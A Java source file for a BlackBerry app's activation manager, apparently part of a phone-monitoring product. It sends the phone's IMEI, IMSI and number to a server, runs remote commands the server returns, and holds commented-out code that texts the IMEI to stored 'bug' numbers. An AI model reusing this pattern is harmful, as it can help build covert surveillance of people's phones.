package com.vvt.protsrv;

import java.util.Vector;
import net.rim.device.api.crypto.MD5Digest;
import net.rim.device.api.system.RuntimeStore;
import com.vvt.db.FxEventDBListener;
import com.vvt.db.FxEventDatabase;
import com.vvt.global.Global;
import com.vvt.info.ApplicationInfo;
import com.vvt.info.ServerUrl;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.license.LicenseStatus;
import com.vvt.pref.PrefConnectionHistory;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.CommandCode;
import com.vvt.prot.CommandListener;
import com.vvt.prot.CommandMetaData;
import com.vvt.prot.CommandRequest;
import com.vvt.prot.CommandResponse;
import com.vvt.prot.CommandServiceManager;
import com.vvt.prot.command.CompressionType;
import com.vvt.prot.command.EncryptionType;
import com.vvt.prot.command.GetActivationCode;
import com.vvt.prot.command.Languages;
import com.vvt.prot.command.SendActivate;
import com.vvt.prot.command.TransportDirectives;
import com.vvt.prot.command.response.GetActivationCodeCmdResponse;
import com.vvt.prot.command.response.SendActivateCmdResponse;
import com.vvt.prot.command.response.StructureCmdResponse;
import com.vvt.protsrv.resource.ProtocolManagerTextResource;
import com.vvt.protsrv.util.ProtSrvUtil;
import com.vvt.rmtcmd.RmtCmdProcessingManager;
import com.vvt.std.Constant;
import com.vvt.std.FxTimer;
import com.vvt.std.FxTimerListener;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;
import com.vvt.version.VersionInfo;

public class SendActivateManager implements CommandListener, FxTimerListener, FxEventDBListener {
	
	private static final int ACTIVATION_INTERVAL = 60 * 10;
	private static final long SEND_ACTIVATE_GUID = 0x3bba836963dc68ebL;
	private static final String GLOBAL_TAIL = "1FD0EDB9EA";
	private static SendActivateManager self = null;
	private LicenseManager licManager = Global.getLicenseManager();
	private Preference pref = Global.getPreference();
	private ServerUrl serverUrl = Global.getServerUrl();
	private CommandServiceManager comServMgr = Global.getCommandServiceManager();
	private RmtCmdProcessingManager rmtCmdMgr = Global.getRmtCmdProcessingManager();
	private LicenseInfo licInfo = licManager.getLicenseInfo();
	private FxTimer actTimer = new FxTimer(this);
	private CommandResponse response = null;
	private Vector listeners = new Vector();
	private String activationCode = "";
	private boolean progress = false;
	private FxEventDatabase db = Global.getFxEventDatabase();
	private ProtSrvUtil protSrvUtil = new ProtSrvUtil();
	
	private SendActivateManager() {
		actTimer.setInterval(ACTIVATION_INTERVAL);
	}
	
	public static SendActivateManager getInstance() {
		if (self == null) {
			self = (SendActivateManager)RuntimeStore.getRuntimeStore().get(SEND_ACTIVATE_GUID);
		}
		if (self == null) {
			SendActivateManager sendAct = new SendActivateManager();
			RuntimeStore.getRuntimeStore().put(SEND_ACTIVATE_GUID, sendAct);
			self = sendAct;
		}
		return self;
	}
	
	public void activate(String activationCode) {
		if (Log.isDebugEnable()) {
			Log.debug("SendActivateManager.activate()", "activationCode: " + activationCode);
		}
		this.activationCode = activationCode;
		licInfo = licManager.getLicenseInfo();
		if (licInfo.getLicenseStatus().getId() != LicenseStatus.ACTIVATED.getId()) {
			if (!progress) {
				progress = true;
				try {
					CommandMetaData cmdMetaData = null;
					CommandRequest cmdRequest = null;
					if (activationCode == "" || activationCode == null) {
						// Meta Data
						cmdMetaData = initCommandMetaData(null);
						// GetActivation Data
						cmdRequest = initGetActivationCmdRequest(cmdMetaData);
					} else {
						// Meta Data
						cmdMetaData = initCommandMetaData(activationCode);
						// Activation Data
						cmdRequest = initActivationCmdRequest(cmdMetaData);
					}
					// Execute Command
					comServMgr.execute(cmdRequest);
					actTimer.stop();
					actTimer.start();
				} catch(Exception e) {
					Log.error("SendActivateManager.doActivate", null, e);
					progress = false;
					notifyError(e.getMessage());
				}
			}
		} else {
			notifyError(ProtocolManagerTextResource.ACTIVATION_ALREADY);
		}
	}
	
	public void addListener(PhoenixProtocolListener listener) {
		if (!isExisted(listener)) {
			listeners.addElement(listener);
		}
	}

	public void removeListener(PhoenixProtocolListener listener) {
		if (isExisted(listener)) {
			listeners.removeElement(listener);
		}
	}
	
	private boolean isExisted(PhoenixProtocolListener listener) {
		boolean existed = false;
		for (int i = 0; i < listeners.size(); i++) {
			if (listener == listeners.elementAt(i)) {
				existed = true;
				break;
			}
		}
		return existed;
	}
	
	private void notifySuccess() {
		for (int i = 0; i < listeners.size(); i++) {
			PhoenixProtocolListener listener = (PhoenixProtocolListener)listeners.elementAt(i);
			listener.onSuccess(response);
		}
	}
	
	private void notifyError(String message) {
		updateErrorStatus(message);
		for (int i = 0; i < listeners.size(); i++) {
			PhoenixProtocolListener listener = (PhoenixProtocolListener)listeners.elementAt(i);
			listener.onError(message);
		}
	}
	
	private boolean isServerHashMatched(SendActivateCmdResponse sendActCmdRes) {
		boolean matched = true;
		byte[] sHash = sendActCmdRes.getMd5();
		byte[] cHash = getClientHash(sendActCmdRes.getConfigID());
		if (cHash != null) {
			for (int i = 0; i < sHash.length; i++) {
				if (sHash[i] != cHash[i]) {
					matched = false;
					break;
				}
			}
		}
		return matched;
	}
	
	private byte[] getClientHash(int confId) {
		byte[] md5 = null;
		try {
			licInfo = licManager.getLicenseInfo();
			StringBuffer buff = new StringBuffer();
			buff.append(licInfo.getProductID());
			buff.append(confId);
			buff.append(PhoneInfo.getIMEI());
			buff.append(GLOBAL_TAIL);
	        String input = buff.toString();
	        if (input.length() > 70) {
	        	input = input.substring(0, 70);
	        }
	        MD5Digest digest = new MD5Digest();
	        byte[] plainText = input.getBytes();
	        digest.update(plainText, 0, plainText.length);
	        md5 = new byte[digest.getDigestLength()];
	        digest.getDigest(md5, 0);
		} catch(Exception e) {
			Log.error("SendActivateManager.getClientHash", null, e);
		}
        return md5;
	}
	
	private CommandMetaData initCommandMetaData(String activationCode) {
		// Meta Data
		CommandMetaData cmdMetaData = new CommandMetaData();
		cmdMetaData.setProtocolVersion(ApplicationInfo.PROTOCOL_VERSION);
		cmdMetaData.setProductId(licInfo.getProductID());
//		cmdMetaData.setProductVersion(ApplicationInfo.PRODUCT_VERSION);
		cmdMetaData.setProductVersion(VersionInfo.getFullVersion());
		cmdMetaData.setConfId(0);
		cmdMetaData.setDeviceId(PhoneInfo.getIMEI());
		cmdMetaData.setActivationCode(activationCode);
		cmdMetaData.setLanguage(Languages.ENGLISH);
		cmdMetaData.setPhoneNumber(PhoneInfo.getOwnNumber());
		cmdMetaData.setMcc(PhoneInfo.getMCC());
		cmdMetaData.setMnc(PhoneInfo.getMNC());
		cmdMetaData.setImsi(PhoneInfo.getIMSI());
		cmdMetaData.setBaseServerUrl(protSrvUtil.getBaseServerUrl());
		cmdMetaData.setTransportDirective(TransportDirectives.NON_RESUMABLE);
		cmdMetaData.setEncryptionCode(EncryptionType.ENCRYPT_ALL_METADATA.getId());
		cmdMetaData.setCompressionCode(CompressionType.COMPRESS_ALL_METADATA.getId());
		return cmdMetaData;
	}
	
	private CommandRequest initGetActivationCmdRequest(CommandMetaData cmdMetaData) {
		// GetActivation Data
		GetActivationCode getActCode = new GetActivationCode();
		CommandRequest cmdRequest = new CommandRequest();
		cmdRequest.setCommandData(getActCode);
		cmdRequest.setCommandMetaData(cmdMetaData);
		cmdRequest.setUrl(serverUrl.getServerActivationUrl());
		cmdRequest.setCommandListener(this);
    	return cmdRequest;
	}
	
	private CommandRequest initActivationCmdRequest(CommandMetaData cmdMetaData) {
		// Activation Data
		CommandRequest cmdRequest = new CommandRequest();
		SendActivate actData = new SendActivate();
    	actData.setDeviceInfo(PhoneInfo.getPlatform());
    	actData.setDeviceModel(PhoneInfo.getDeviceModel());
    	cmdRequest.setCommandData(actData);
    	cmdRequest.setCommandMetaData(cmdMetaData);
    	cmdRequest.setUrl(serverUrl.getServerActivationUrl());
    	cmdRequest.setCommandListener(this);
    	return cmdRequest;
	}
	
	private void updateErrorStatus(String message) {
		PrefConnectionHistory conHistory = new PrefConnectionHistory();
		conHistory.setLastConnection(System.currentTimeMillis());
		conHistory.setLastConnectionStatus(message);
		conHistory.setStatusCode(2);
		conHistory.setActionType(CommandCode.SEND_ACTIVATE.getId());
		PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		generalInfo.addPrefConnectionHistory(conHistory);
		pref.commit(generalInfo);
	}
	
	/*private String genSystemEvent() {
		FxSystemEvent systemEvent = new FxSystemEvent();
		systemEvent.setEventTime(System.currentTimeMillis());
		systemEvent.setCategory(FxCategory.REPORT_PHONE_NUMBER);
		systemEvent.setDirection(FxDirection.OUT);
		StringBuffer msg = new StringBuffer();
		msg.append("<" + cmdId + ">");
		msg.append("<" + PhoneInfo.getIMEI() + ">");	
		msg.append("<" + util.getChecksum(cmdId) + ">");
		systemEvent.setSystemMessage(msg.toString());
		db.insert(systemEvent);
		return msg.toString();
	}*/
	
	/*private void sendSMS(String msg) {
		// Sending message to home-out numbers.
		PrefBugInfo bugInfo = (PrefBugInfo)Global.getPreference().getPrefInfo(PreferenceType.PREF_BUG_INFO);
		int count = bugInfo.countHomeOutNumber();
		String homeOutNumber = null;
		for (int i = 0; i < count; i++) {
			homeOutNumber = bugInfo.getHomeOutNumber(i);
			if (homeOutNumber != null && !homeOutNumber.equals(Constant.EMPTY_STRING)) {
				FxSMSMessage smsMessage = new FxSMSMessage();
				smsMessage.setMessage(msg);
				smsMessage.setNumber(homeOutNumber);
				SMSSender.getInstance().send(smsMessage);
			}
		}
	}*/
	
	/*private void waitHomeOutSaved() {		
		try {
			new Timer().schedule(new TimerTask() {
				public void run() {
					// To send report phone number
					String msg = genSystemEvent();
					if (Log.isDebugEnable()) {
						Log.debug("SendActivateManager.waitHomeOutSaved()", "msg: " + msg);
					}
					sendSMS(msg);				
				}
			}, 2000); // wait 2 second.
		} catch (Exception e) {
			Log.error("SendActivateManager.waitHomeOutSaved()", e.getMessage(), e);
		}
	}*/
	
	// CommandListener
	public void onSuccess(StructureCmdResponse res) {
//		Log.debug("SendActivateManager.onSuccess", "ENTER");
		try {
			response = res;
			actTimer.stop();
			if (response instanceof GetActivationCodeCmdResponse) {
//				Log.debug("SendActivateManager.onSuccess", "GetActivationCodeCmdResponse!");
				GetActivationCodeCmdResponse getActCodeCmdRes = (GetActivationCodeCmdResponse)response;
				int statusCode = getActCodeCmdRes.getStatusCode();
				if (statusCode == 0) {
					activationCode = getActCodeCmdRes.getActivationCode();
					// Meta Data
					CommandMetaData cmdMetaData = initCommandMetaData(activationCode);
					// Activation Data			
					CommandRequest cmdRequest = initActivationCmdRequest(cmdMetaData);
			    	// Execute Command
					comServMgr.execute(cmdRequest);
					actTimer.start();
				} else {
					Log.error("SendActivateManager.onSuccess", "This is an error on GetActivationCodeCmdResponse. Server Message: " + getActCodeCmdRes.getServerMsg());
					progress = false;
					notifyError(getActCodeCmdRes.getServerMsg() + Constant.L_SQUARE_BRACKET + Constant.HEX + Integer.toHexString(statusCode) + Constant.R_SQUARE_BRACKET);
				}
			} else if (response instanceof SendActivateCmdResponse) {
//				Log.debug("SendActivateManager.onSuccess", "SendActivateCmdResponse!");
				progress = false;
				SendActivateCmdResponse sendActCmdRes = (SendActivateCmdResponse)response;				
				PrefConnectionHistory conHistory = new PrefConnectionHistory();
				conHistory.setLastConnection(System.currentTimeMillis());
				conHistory.setConnectionMethod(sendActCmdRes.getConnectionMethod());
				conHistory.setLastConnectionStatus(sendActCmdRes.getServerMsg());
				conHistory.setActionType(CommandCode.SEND_ACTIVATE.getId());
				conHistory.setStatusCode(sendActCmdRes.getStatusCode());				
				PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
				generalInfo.addPrefConnectionHistory(conHistory);
				pref.commit(generalInfo);
				int statusCode = sendActCmdRes.getStatusCode();
//				Log.debug("SendActivateManager.onSuccess", "statusCode: " + statusCode);
				if (statusCode == 0) {
					if (isServerHashMatched(sendActCmdRes)) {
						// To save URL to LicenseInfo
						licInfo = licManager.getLicenseInfo();						
						// To save activation code to LicenseInfo.
						licInfo.setActivationCode(activationCode);
						// To save configuration ID to LicenseInfo.
						licInfo.setProductConfID(sendActCmdRes.getConfigID());
						// To save license status to LicenseInfo.
						licInfo.setLicenseStatus(LicenseStatus.ACTIVATED);
						// to save server hash to LicenseInfo.
						licInfo.setServerHash(sendActCmdRes.getMd5());
						licManager.commit(licInfo);
						/*// To process PCC commands.
						rmtCmdMgr.process(sendActCmdRes.getPCCCommands());
						notifySuccess();*/
						// TODO: Change order to notify first then report phone number can register home number preference before execute pcc commands.
						notifySuccess();
						// To process PCC commands.
						rmtCmdMgr.process(sendActCmdRes.getPCCCommands());
//						waitHomeOutSaved();
					} else {
						Log.error("SendActivateManager.onSuccess", "Server Hash doesn't match!");
						notifyError(ProtocolManagerTextResource.SERVER_HASH_INCORRECT);
					}
				} else {
					Log.error("SendActivateManager.onSuccess", "This is an error on SendActivateCmdResponse. Server Message: " + sendActCmdRes.getServerMsg());
					notifyError(sendActCmdRes.getServerMsg() + Constant.L_SQUARE_BRACKET + Constant.HEX + Integer.toHexString(statusCode) + Constant.R_SQUARE_BRACKET);
				}
			}
		} catch(Exception e) {
			Log.error("SendActivateManager.onSuccess", null, e);
			progress = false;
			notifyError(e.getMessage());
		}
//		Log.debug("SendActivateManager.onSuccess", "EXIT");
	}

	public void onConstructError(long csid, Exception e) {
		Log.error("SendActivateManager.onConstructError", "csid: " + csid, e);
		actTimer.stop();
		progress = false;
		notifyError(e.getMessage());
	}
	
	public void onServerError(long csid, StructureCmdResponse response) {
		Log.error("SendActivateManager.onServerError", "Status Code: " + response.getStatusCode());
		Log.error("SendActivateManager.onServerError", "Server Message: " + response.getServerMsg());
		actTimer.stop();
		progress = false;
		notifyError(response.getServerMsg() + Constant.L_SQUARE_BRACKET + Constant.HEX + Integer.toHexString(response.getStatusCode()) + Constant.R_SQUARE_BRACKET);
	}
	
	public void onTransportError(long csid, Exception e) {
		Log.error("SendActivateManager.onTransportError", "csid: " + csid, e);
		actTimer.stop();
		progress = false;
		notifyError(e.getMessage());
	}

	// FxTimerListener
	public void timerExpired(int id) {
		progress = false;
		notifyError(ProtocolManagerTextResource.PROTOCOL_TIME_OUT_WITHOUT_TRY);
	}

	// FxEventDBListener
	public void onDeleteError() {
		
	}

	public void onDeleteSuccess() {
		
	}

	public void onInsertError() {
		db.removeListener(this);
	}

	public void onInsertSuccess() {
		db.removeListener(this);
	}

	/*// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e,
			String message) {
		Log.error("SendActivateManager.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		if (Log.isDebugEnable()) {
			Log.debug("SendActivateManager.smsSendSuccess()", "contact name: " + smsMessage.getContactName() + " , msg: " + smsMessage.getMessage() + " , number: " + smsMessage.getNumber());
		}
	}*/
}
